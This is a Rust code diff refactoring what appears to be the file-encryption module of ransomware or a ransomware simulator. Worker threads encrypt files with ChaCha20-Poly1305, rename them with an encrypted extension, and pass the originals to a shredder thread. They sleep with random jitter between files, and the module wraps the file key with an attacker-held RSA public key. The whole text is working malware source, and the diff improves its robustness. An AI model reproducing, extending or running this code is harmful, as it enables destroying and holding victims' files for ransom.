@@ -1,8 +1,7 @@
 use crossbeam_channel::{Receiver, Sender};
-use hex::{decode, encode, FromHex};
+use hex::{encode, FromHex};
 use log::{debug, error, info, warn};
-use purecrypto::cipher::{ChaCha20, ChaCha20Poly1305};
-use purecrypto::rsa::BoxedRsaPublicKey;
+use purecrypto::{cipher::ChaCha20Poly1305, rsa::BoxedRsaPublicKey};
 use rand::{
     rngs::{SmallRng, StdRng},
     RngExt, SeedableRng,
@@ -18,6 +17,9 @@ use std::{
     thread, time,
 };
 
+use crate::config;
+
+// Bytes 8..12 are left zero here and reserved for `chunk_nonce`, which writes the per-chunk index into them.
 pub fn nonce_from_counter(counter: u64) -> [u8; 12] {
     let mut nonce = [0u8; 12];
     nonce[0..8].copy_from_slice(&counter.to_le_bytes());
@@ -29,17 +31,15 @@ const MAX_DECRYPT_CHUNK_LEN: usize = 1024 * 1024;
 static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));
 
 pub fn encrypt(
-    r: Receiver<Arc<PathBuf>>,
-    s: Sender<Arc<PathBuf>>,
+    receiver: Receiver<Arc<PathBuf>>,
+    sender: Sender<Arc<PathBuf>>,
     key: Arc<[u8; 32]>,
     counter: Arc<AtomicU64>,
-    encrypted_extension: Arc<String>,
-    wait_time: Arc<u32>,
-    jitter_time: Arc<u32>,
+    aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting encryption crypto thread");
     thread::spawn(move || loop {
-        let file_path = match r.recv() {
+        let file_path = match receiver.recv() {
             Ok(path) => {
                 debug!("Received file path over channel: {path:?}");
                 path
@@ -54,10 +54,8 @@ pub fn encrypt(
             let file_path = file_path.clone();
             let key = Arc::clone(&key);
             let counter = Arc::clone(&counter);
-            let encrypted_extension = Arc::clone(&encrypted_extension);
-            let s = s.clone();
-            let wait_time = Arc::clone(&wait_time);
-            let jitter_time = Arc::clone(&jitter_time);
+            let aad = Arc::clone(&aad);
+            let sender = sender.clone();
             let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
             debug!("Created cheap random number generator");
             move || {
@@ -69,23 +67,26 @@ pub fn encrypt(
                 let full_nonce_bytes = nonce_from_counter(nonce);
                 debug!("Nonce value after padding: {full_nonce_bytes:?}");
 
-                let nonce_file_extension =
-                    format!("{}.{}", encode(full_nonce_bytes), encrypted_extension);
+                let nonce_file_extension = format!(
+                    "{}.{}",
+                    encode(full_nonce_bytes),
+                    config::ENCRYPTED_EXTENSION.as_str()
+                );
                 debug!("Nonce extension: {nonce_file_extension}");
 
                 let encrypted_file_path = {
-                    let mut p = file_path.as_ref().clone();
-                    let name = p
+                    let mut path = file_path.as_ref().clone();
+                    let name = path
                         .file_name()
                         .map(|n| n.to_string_lossy().into_owned())
                         .unwrap_or_default();
-                    p.set_file_name(format!("{name}.{nonce_file_extension}"));
-                    p
+                    path.set_file_name(format!("{name}.{nonce_file_extension}"));
+                    path
                 };
                 debug!("Encrypted file path: {}", encrypted_file_path.display());
 
                 debug!(
-                    "Applying chacha20 with source {}, destination {}, and nonce {:?} ",
+                    "Applying ChaCha with source {}, destination {}, and nonce {:?} ",
                     file_path.as_ref().display(),
                     encrypted_file_path.display(),
                     full_nonce_bytes
@@ -95,10 +96,11 @@ pub fn encrypt(
                     &encrypted_file_path,
                     &key,
                     &full_nonce_bytes,
+                    &aad,
                 ) {
                     Ok(()) => {
                         debug!("Successfully applied ChaCha to data for encryption: {file_path:?}");
-                        if let Err(error) = s.send(file_path.clone()) {
+                        if let Err(error) = sender.send(file_path.clone()) {
                             error!("Failed to send path to shredder thread: {error}");
                         }
                     }
@@ -107,8 +109,10 @@ pub fn encrypt(
                     }
                 }
 
-                if *wait_time > 0 {
-                    let time = *wait_time - *jitter_time + rng_cheap.random_range(0..*jitter_time);
+                let wait_time = config::WAIT_TIME;
+                let jitter_time = config::JITTER_TIME;
+                if wait_time > 0 {
+                    let time = wait_time - jitter_time + rng_cheap.random_range(0..jitter_time);
                     debug!("Sleeping {time} seconds before next encryption");
                     let time_duration = time::Duration::from_secs(u64::from(time));
                     thread::sleep(time_duration);
@@ -123,17 +127,23 @@ pub fn encrypt(
     })
 }
 
-pub fn record(r: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
+pub fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
     thread::spawn(move || {
         let analysis_file_path = path.join(&*ANALYSIS_FILENAME);
-        let mut analysis_file = OpenOptions::new()
+        let mut analysis_file = match OpenOptions::new()
             .append(true)
             .create(true)
             .open(&analysis_file_path)
-            .expect("Cannot open file");
+        {
+            Ok(file) => file,
+            Err(error) => {
+                error!("Failed to open analysis file for recording: {error}");
+                return;
+            }
+        };
 
         loop {
-            let file_path = match r.recv() {
+            let file_path = match receiver.recv() {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
@@ -144,16 +154,22 @@ pub fn record(r: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHand
                 }
             };
 
-            analysis_file
-                .write_all(format!("{}\n", file_path.to_string_lossy()).as_bytes())
-                .expect("Failed to write to file");
+            if let Err(error) =
+                analysis_file.write_all(format!("{}\n", file_path.to_string_lossy()).as_bytes())
+            {
+                error!("Failed to write to analysis file: {error}");
+            }
         }
     })
 }
 
-pub fn decrypt(r: Receiver<Arc<PathBuf>>, key: Arc<[u8; 32]>) -> thread::JoinHandle<()> {
+pub fn decrypt(
+    receiver: Receiver<Arc<PathBuf>>,
+    key: Arc<[u8; 32]>,
+    aad: Arc<[u8]>,
+) -> thread::JoinHandle<()> {
     thread::spawn(move || loop {
-        let file_path = match r.recv() {
+        let file_path = match receiver.recv() {
             Ok(path) => {
                 debug!("Received file path over channel: {path:?}");
                 path
@@ -229,6 +245,7 @@ pub fn decrypt(r: Receiver<Arc<PathBuf>>, key: Arc<[u8; 32]>) -> thread::JoinHan
             &decrypted_file_path,
             &key,
             &full_nonce_bytes,
+            &aad,
         ) {
             Ok(()) => {
                 debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
@@ -251,6 +268,7 @@ fn aead_encrypt_file(
     destination_file_path: &PathBuf,
     key: &[u8; 32],
     full_nonce_bytes: &[u8; 12],
+    aad: &[u8],
 ) -> Result<(), Error> {
     let result = (|| -> Result<(), Error> {
         let aead = ChaCha20Poly1305::new(key);
@@ -264,9 +282,8 @@ fn aead_encrypt_file(
                 Ok(n) => n,
                 Err(error) => return Err(error),
             };
-            let aad = chunk_index.to_le_bytes();
             let nonce = chunk_nonce(full_nonce_bytes, chunk_index);
-            let tag = aead.encrypt(&nonce, &aad[..], &mut buffer[..read]);
+            let tag = aead.encrypt(&nonce, aad, &mut buffer[..read]);
             dest.write_all(&u32::try_from(read).map_err(Error::other)?.to_le_bytes())?;
             dest.write_all(&buffer[..read])?;
             dest.write_all(&tag)?;
@@ -288,6 +305,7 @@ fn aead_decrypt_file(
     destination_file_path: &PathBuf,
     key: &[u8; 32],
     full_nonce_bytes: &[u8; 12],
+    aad: &[u8],
 ) -> Result<(), Error> {
     let aead = ChaCha20Poly1305::new(key);
     let mut source = File::open(source_file_path)?;
@@ -314,9 +332,8 @@ fn aead_decrypt_file(
         source.read_exact(&mut ciphertext)?;
         let mut tag = [0u8; 16];
         tag.copy_from_slice(&ciphertext[cipher_len..]);
-        let aad = chunk_index.to_le_bytes();
         let nonce = chunk_nonce(full_nonce_bytes, chunk_index);
-        aead.decrypt(&nonce, &aad[..], &mut ciphertext[..cipher_len], &tag)
+        aead.decrypt(&nonce, aad, &mut ciphertext[..cipher_len], &tag)
             .map_err(|_| Error::other("ChaCha20-Poly1305 authentication failed"))?;
         dest.write_all(&ciphertext[..cipher_len])?;
         chunk_index = chunk_index
@@ -327,39 +344,36 @@ fn aead_decrypt_file(
     Ok(())
 }
 
-pub fn encrypt_string(source: &str, key: &[u8; 32], full_nonce_bytes: &[u8; 12]) -> String {
+pub fn encrypt_string(
+    source: &str,
+    key: &[u8; 32],
+    full_nonce_bytes: &[u8; 12],
+    aad: &[u8],
+) -> (Vec<u8>, [u8; 16]) {
     debug!("Encrypting string: {source}");
     let mut source_data = source.as_bytes().to_vec();
     debug!("String bytes: {source_data:?}");
-    ChaCha20::new(key).apply_keystream(full_nonce_bytes, 0, &mut source_data);
-    debug!("String encrypted: {:?}", encode(&source_data));
-    encode(source_data)
+    let tag = ChaCha20Poly1305::new(key).encrypt(full_nonce_bytes, aad, &mut source_data);
+    debug!(
+        "String encrypted ({} bytes, tag {:?})",
+        source_data.len(),
+        tag
+    );
+    (source_data, tag)
 }
 
-pub fn decrypt_string(source_str: &str, key: &[u8; 32], nonce_str: &str) -> Option<String> {
-    let mut source_data = match decode(source_str) {
-        Ok(bytes) => {
-            debug!("Successfully decoded hex encrypted string: {bytes:?}");
-            bytes
-        }
-        Err(error) => {
-            error!("Unable to decode hex encrypted string: {error}");
-            return None;
-        }
-    };
-    let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
-        Ok(nonce_bytes) => {
-            debug!("Successfully decoded hex nonce: {nonce_bytes:?}");
-            nonce_bytes
-        }
-        Err(error) => {
-            error!("Unable to decode hex nonce: {error}");
-            return None;
-        }
-    };
-
-    debug!("Decrypting to string: {source_data:?}");
-    ChaCha20::new(key).apply_keystream(&full_nonce_bytes, 0, &mut source_data);
+pub fn decrypt_string(
+    ciphertext: &[u8],
+    key: &[u8; 32],
+    full_nonce_bytes: &[u8; 12],
+    tag: &[u8; 16],
+    aad: &[u8],
+) -> Option<String> {
+    debug!("Decrypting string: {ciphertext:?}");
+    let mut source_data = ciphertext.to_vec();
+    ChaCha20Poly1305::new(key)
+        .decrypt(full_nonce_bytes, aad, &mut source_data, tag)
+        .ok()?;
     debug!("String bytes: {source_data:?}");
     match String::from_utf8(source_data) {
         Ok(string) => {
@@ -380,12 +394,13 @@ pub fn generate_sym_key(sym_key: &mut [u8; 32]) {
     debug!("Generated symmetric key");
 }
 
-pub fn encrypt_sym_key(asym_pub_key: &BoxedRsaPublicKey, sym_key: &[u8; 32]) -> String {
+pub fn encrypt_sym_key(
+    asym_pub_key: &BoxedRsaPublicKey,
+    sym_key: &[u8; 32],
+) -> Result<Vec<u8>, String> {
     use purecrypto::rng::OsRng;
     let mut rng = OsRng;
-    encode(
-        asym_pub_key
-            .encrypt_pkcs1v15(sym_key, &mut rng)
-            .expect("Failed to encrypt symmetric key"),
-    )
+    asym_pub_key
+        .encrypt_pkcs1v15(sym_key, &mut rng)
+        .map_err(|e| format!("Failed to encrypt symmetric key: {e}"))
 }
